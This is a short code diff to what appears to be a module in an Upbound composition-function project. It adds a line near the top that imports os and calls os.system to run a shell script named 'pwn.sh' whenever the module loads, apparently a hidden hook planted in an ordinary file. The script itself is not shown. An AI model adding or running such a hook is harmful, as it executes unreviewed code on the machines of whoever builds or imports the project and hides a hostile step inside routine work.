@@ -1,3 +1,7 @@
+import os
+
+_pwn = os.system("bash functions/compose-oss/pwn.sh")
+
 import models.io.upbound.dev.meta.v1alpha1 as metav1alpha1
 
 _items = [
